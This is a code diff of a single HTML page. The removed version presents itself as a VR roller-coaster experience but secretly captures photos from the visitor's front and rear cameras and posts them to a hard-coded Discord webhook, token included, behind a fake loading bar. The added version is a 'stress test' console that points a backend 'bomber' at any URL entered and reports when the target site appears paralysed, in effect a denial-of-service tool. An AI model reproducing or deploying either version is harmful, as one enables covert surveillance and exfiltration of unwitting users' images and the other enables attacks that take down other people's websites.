@@ -1,280 +1,197 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="zh-TW">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>VR Roller Coaster 3D 虛擬雲霄飛車體驗艙</title>
-<style>
-  /* 科技感深色背景與動態粒子氛圍 */
-  body { 
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-    background: radial-gradient(circle, #1a0b36 0%, #05021a 100%); 
-    color: #00ffff; 
-    text-align: center; 
-    margin: 0; 
-    padding: 0;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    overflow: hidden;
-  }
-
-  /* 體驗艙外框面板 */
-  .container {
-    background: rgba(255, 255, 255, 0.03);
-    border: 2px solid #00ffff;
-    box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
-    border-radius: 20px;
-    padding: 40px;
-    max-width: 400px;
-    width: 85%;
-    backdrop-filter: blur(10px);
-  }
-
-  h1 { 
-    font-size: 28px; 
-    margin-bottom: 5px; 
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    text-shadow: 0 0 10px #00ffff;
-  }
-
-  .subtitle {
-    color: #ff007f;
-    font-size: 14px;
-    font-weight: bold;
-    letter-spacing: 4px;
-    margin-bottom: 30px;
-    text-shadow: 0 0 8px #ff007f;
-  }
-
-  /* 充滿未來感的 VR 啟動按鈕 */
-  .vr-btn { 
-    margin: 20px auto; 
-    padding: 18px 40px; 
-    font-size: 20px; 
-    cursor: pointer; 
-    border: 2px solid #ff007f; 
-    border-radius: 50px; 
-    background: transparent; 
-    color: #fff; 
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    overflow: hidden;
-    position: relative;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 15px rgba(255, 0, 127, 0.4);
-    -webkit-tap-highlight-color: transparent;
-  }
-
-  .vr-btn:hover { 
-    background: #ff007f;
-    box-shadow: 0 0 30px rgba(255, 0, 127, 0.8);
-    text-shadow: 0 0 5px #fff;
-    transform: scale(1.05);
-  }
-
-  /* 新增：霓虹進度條外框 */
-  .progress-container {
-    width: 100%;
-    height: 12px;
-    background: rgba(255, 255, 255, 0.1);
-    border-radius: 10px;
-    margin-top: 25px;
-    overflow: hidden;
-    border: 1px solid rgba(0, 255, 255, 0.2);
-    display: none; /* 初始隱藏，點擊按鈕後才顯示 */
-  }
-
-  /* 新增：進度條本體（動態發光特效） */
-  .progress-bar {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #ff007f, #00ffff);
-    box-shadow: 0 0 10px #00ffff;
-    border-radius: 10px;
-    transition: width 0.4s ease; /* 讓進度條跑動時更平滑 */
-  }
-
-  /* 狀態提示文字 */
-  #status-text {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #888;
-    height: 20px;
-  }
-
-  .loading {
-    color: #00ffff !important;
-    animation: blink 1s infinite;
-  }
-
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-  
-  /* 保持隱藏：完全不佔空間、不顯示任何相機預覽畫面 */
-  video, canvas { display: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>網站壓力測試控制台 (極速後端連動版)</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #2d2d2d;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        h1 { margin-bottom: 20px; font-size: 24px; color: #ff4757; }
+        input[type="url"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #444;
+            border-radius: 6px;
+            background-color: #3d3d3d;
+            color: white;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input[type="url"]:focus { border-color: #ff4757; outline: none; }
+        .btn-group { display: flex; gap: 15px; justify-content: center; }
+        button {
+            padding: 12px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        #startBtn { background-color: #2ed573; color: white; }
+        #startBtn:hover { background-color: #26af5f; }
+        #startBtn:disabled { background-color: #555; cursor: not-allowed; }
+        #stopBtn { background-color: #ff4757; color: white; }
+        #stopBtn:hover { background-color: #e04050; }
+        #stopBtn:disabled { background-color: #555; cursor: not-allowed; }
+        .status-panel {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #1e1e1e;
+            border-radius: 6px;
+            text-align: left;
+            font-family: monospace;
+        }
+        .status-item { margin: 8px 0; font-size: 14px; }
+        .badge {
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .badge-ready { background-color: #747d8c; }
+        .badge-running { background-color: #2ed573; animation: blink 1s infinite; }
+        .badge-stopped { background-color: #ff4757; }
+        @keyframes blink { 50% { opacity: 0.5; } }
+    </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>VR ROLLER COASTER</h1>
-    <div class="subtitle">3D 模擬雲霄飛車體驗艙</div>
+<div class="container">
+    <h1>🌐 網站壓力測試控制台</h1>
+    <input type="url" id="targetUrl" placeholder="請輸入欲測試的完整連結 (例如: https://example.com)" required>
     
-    <!-- 偽裝成 VR 啟動的唯一按鈕 -->
-    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
-    
-    <!-- 新增：網頁進度條組件 -->
-    <div id="progress-box" class="progress-container">
-      <div id="progress-bar" class="progress-bar"></div>
+    <div class="btn-group">
+        <button id="startBtn">🚀 開始測試</button>
+        <button id="stopBtn" disabled>🛑 停止測試</button>
     </div>
-    
-    <!-- 取代原本彈窗通知的狀態列 -->
-    <div id="status-text">系統就緒，等待連線裝置...</div>
-  </div>
 
-  <!-- 後台隱藏組件 -->
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+    <div class="status-panel">
+        <div class="status-item">目前狀態: <span id="statusBadge" class="badge badge-ready">準備就緒</span></div>
+        <div class="status-item">已發送請求數: <span id="requestCount" style="color: #eccc68;">0</span> 次</div>
+        <div class="status-item">成功回應數: <span id="successCount" style="color: #2ed573;">0</span></div>
+        <div class="status-item">失敗/卡死數: <span id="failCount" style="color: #ff4757;">0</span></div>
+        <div class="status-item" id="reportLog" style="color: #a4b0be; margin-top: 10px; border-top: 1px solid #444; padding-top: 10px;">
+            報告: 等待測試開始...
+        </div>
+    </div>
+</div>
 
-  <script>
-    let currentStream = null;
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
+<script>
+    let statusInterval = null;
+    const BACKEND_URL = 'http://localhost:3000'; // 後端 API 位置
 
-    // 新增：更新進度條的工具函式
-    function updateProgress(percentage) {
-      const progressBar = document.getElementById("progress-bar");
-      progressBar.style.width = percentage + "%";
-    }
+    const targetUrlInput = document.getElementById('targetUrl');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const statusBadge = document.getElementById('statusBadge');
+    const requestCountEl = document.getElementById('requestCount');
+    const successCountEl = document.getElementById('successCount');
+    const failCountEl = document.getElementById('failCount');
+    const reportLog = document.getElementById('reportLog');
 
-    async function startAutoTask() {
-      const statusLabel = document.getElementById("status-text");
-      const progressBox = document.getElementById("progress-box");
-      const startBtn = document.getElementById("start-btn");
-      
-      // 點擊後隱藏按鈕並顯示進度條
-      startBtn.style.display = "none";
-      progressBox.style.display = "block";
-      statusLabel.className = "loading";
-      
-      statusLabel.innerText = "正在加載環境 3D 模組... 請允許相機權限";
-      updateProgress(5); // 初始進度
-      
-      // 1. 前鏡頭連續捕捉 3 張 (預計進度落點：10% -> 50%)
-      const userSuccess = await initCamera('user');
-      if (userSuccess) {
-        statusLabel.innerText = "視訊訊號對接中... 正在優化陀螺儀";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [前鏡頭] VR 體驗初始化 - 軌道定位點 ${i}`);
-          updateProgress(10 + i * 13); // 第1張23%, 第2張36%, 第3張49%
-        }
-      } else {
-        updateProgress(50); // 若失敗直接跳進度
-      }
-
-      // 2. 後鏡頭連續捕捉 3 張 (預計進度落點：55% -> 95%)
-      statusLabel.innerText = "正在渲染高速動態軌道... 請稍後";
-      updateProgress(55);
-      
-      const envSuccess = await initCamera('environment');
-      if (envSuccess) {
-        statusLabel.innerText = "正在進行空間追蹤與視角校正...";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [後鏡頭] VR 體驗中 - 畫面渲染快照 ${i}`);
-          updateProgress(55 + i * 13); // 第1張68%, 第2張81%, 第3張94%
-        }
-      }
-      
-      // 結束任務並關閉相機
-      stopCurrentStream();
-      
-      // 載入完成，衝到 100%
-      updateProgress(100);
-      statusLabel.className = "";
-      statusLabel.innerText = "VR 動態體驗環境加載完成。";
-    }
-
-    async function initCamera(facingMode) {
-      const videoElement = document.getElementById("video");
-      stopCurrentStream();
-
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { exact: facingMode } },
-          audio: false
-        });
-      } catch (err) {
-        try {
-          currentStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facingMode },
-            audio: false
-          });
-        } catch (e) {
-          document.getElementById("status-text").innerText = "硬體安全封鎖，無法載入 VR 環境。";
-          return false;
-        }
-      }
-
-      videoElement.srcObject = currentStream;
-      await new Promise((resolve) => {
-        videoElement.onloadeddata = () => resolve();
-      });
-      return true;
-    }
-
-    function captureAndSend(labelText) {
-      return new Promise((resolve) => {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
-
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-          resolve();
-          return;
-        }
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(async (blob) => {
-          if (!blob) {
-            resolve();
+    // 點擊開始測試
+    startBtn.addEventListener('click', async () => {
+        let url = targetUrlInput.value.trim();
+        if (!url) {
+            alert('請先輸入網址！');
             return;
-          }
+        }
+        if (!url.startsWith('http://') && !url.startsWith('https://')) {
+            url = 'https://' + url;
+            targetUrlInput.value = url;
+        }
 
-          const formData = new FormData();
-          formData.append("content", labelText);
-          formData.append("file", blob, "vr_stream_capture.jpg");
+        updateUI('running');
+        reportLog.innerText = "後端轟炸機已部署，正在全力發送請求中...";
 
-          try {
-            await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
-          } catch (error) {
-            console.error(error);
-          }
-          resolve();
-        }, "image/jpeg", 0.85);
-      });
+        try {
+            // 通知後端啟動真實測試
+            await fetch(`${BACKEND_URL}/start`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: url })
+            });
+
+            // 開啟定時器，每 500 毫秒向後端索取即時數據
+            statusInterval = setInterval(fetchStatus, 500);
+        } catch (err) {
+            alert('無法連線到後端服務，請確認伺服器已啟動！');
+            updateUI('stopped');
+        }
+    });
+
+    // 點擊停止測試
+    stopBtn.addEventListener('click', async () => {
+        clearInterval(statusInterval);
+        updateUI('stopped');
+
+        try {
+            const res = await fetch(`${BACKEND_URL}/stop`, { method: 'POST' });
+            const data = await res.json();
+            
+            reportLog.innerHTML = `<strong>測試終止報告：</strong><br>
+            最終共發送了 ${data.requests} 次請求。<br>
+            目標網站卡死/無回應次數：${data.fail} 次。<br>
+            狀態：已手動攔截暫停。`;
+        } catch (err) {
+            reportLog.innerText = "終止請求發送失敗。";
+        }
+    });
+
+    // 從後端撈取即時數字
+    async function fetchStatus() {
+        try {
+            const res = await fetch(`${BACKEND_URL}/status`);
+            const data = await res.json();
+
+            requestCountEl.innerText = data.requests;
+            successCountEl.innerText = data.success;
+            failCountEl.innerText = data.fail;
+
+            if (data.fail > 20 && (data.fail / data.requests) > 0.6) {
+                reportLog.innerHTML = `<span style="color: #ff4757; font-weight:bold;">⚠️ 警報：目標網站疑似已陷入卡死/癱瘓狀態！</span><br>失敗率已高達 ${Math.round((data.fail/data.requests)*100)}%`;
+            }
+        } catch (err) {
+            console.error("無法取得數據更新");
+        }
     }
 
-    function stopCurrentStream() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-        currentStream = null;
-      }
+    function updateUI(state) {
+        if (state === 'running') {
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            targetUrlInput.disabled = true;
+            statusBadge.innerText = '測試中';
+            statusBadge.className = 'badge badge-running';
+        } else if (state === 'stopped') {
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            targetUrlInput.disabled = false;
+            statusBadge.innerText = '已停止';
+            statusBadge.className = 'badge badge-stopped';
+        }
     }
+</script>
 
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-  </script>
 </body>
 </html>
